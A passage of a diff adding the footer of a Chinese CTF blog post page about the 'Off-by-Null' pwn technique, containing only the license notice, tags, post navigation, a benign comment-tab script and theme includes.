+      <a href="https://mark0519.github.io/2021/06/07/pwn-Off-by-Null/" title="pwn-Off_by_Null">https://mark0519.github.io/2021/06/07/pwn-Off-by-Null/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/python2/" rel="tag"># python2</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/06/07/pwn-text%E6%AE%B5%E5%8F%AF%E6%94%B9/" rel="prev" title="pwn-text段可改">
+                  <i class="fa fa-chevron-left"></i> pwn-text段可改
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mark0519</span>
+</div> <!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div> -->
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
